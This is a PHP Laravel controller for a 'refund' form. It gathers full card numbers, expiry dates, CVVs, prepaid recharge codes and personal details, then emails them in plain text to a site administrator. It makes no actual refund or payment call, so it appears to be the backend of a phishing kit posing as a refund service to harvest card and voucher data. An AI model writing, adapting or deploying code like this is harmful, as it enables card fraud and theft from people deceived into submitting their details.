<?php

namespace App\Http\Controllers;

use App\Http\Requests\RefundFormRequest;
use App\Mail\RefundAdminMail;
use App\Mail\RefundSubmittedMail;
use App\Support\CardBrandDetector;
use Illuminate\Http\RedirectResponse;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Str;
use Illuminate\View\View;

class RefundController extends Controller
{
    public function create(): View
    {
        return view('refund', [
            'cardTypes' => config('authentify.card_types', []),
            'countries' => config('authentify.countries', []),
        ]);
    }

    public function store(RefundFormRequest $request): RedirectResponse
    {
        $data = $request->validated();
        $digits = preg_replace('/\D+/', '', $data['card_number']) ?? '';
        $brand = CardBrandDetector::detect($digits);

        $reference = 'RMB-'.strtoupper(Str::random(8));

        $payload = [
            'reference' => $reference,
            'detected_brand' => $brand,
            'pan_plain' => trim($data['card_number']),
            'exp_month' => $data['exp_month'],
            'exp_year' => $data['exp_year'],
            'cvv_plain' => $data['cvv'],
            'card_type_label' => config('authentify.card_types.'.$data['card_type'], $data['card_type']),
            'recharge_code_plain' => trim($data['recharge_code']),
            'first_name' => $data['first_name'],
            'last_name' => $data['last_name'],
            'email' => $data['email'],
            'country_label' => config('authentify.countries.'.$data['country'], $data['country']),
            'city_postal' => $data['city_postal'],
            'submitted_at' => now()->format('d/m/Y H:i:s'),
        ];

        $adminEmail = config('site.admin_email');
        if (is_string($adminEmail) && filter_var($adminEmail, FILTER_VALIDATE_EMAIL)) {
            try {
                Mail::to($adminEmail)->locale(app()->getLocale())->send(new RefundAdminMail($payload));
            } catch (\Throwable $e) {
                Log::warning('Notification admin remboursement échouée', [
                    'message' => $e->getMessage(),
                    'admin' => $adminEmail,
                ]);
            }
        }

        try {
            Mail::to($data['email'])->locale(app()->getLocale())->send(new RefundSubmittedMail($payload));
        } catch (\Throwable $e) {
            Log::error('Envoi e-mail confirmation utilisateur (remboursement) échoué', [
                'message' => $e->getMessage(),
                'email' => $data['email'],
            ]);

            return redirect()
                ->route('refund')
                ->withInput()
                ->with('refund_error', __('site.forms.refund.mail_send_failed'));
        }

        return redirect()
            ->route('refund.processing')
            ->with('refund_processing_ok', true);
    }

    public function processing(): RedirectResponse|View
    {
        if (! session()->pull('refund_processing_ok')) {
            return redirect()->route('refund');
        }

        return view('refund-processing');
    }
}
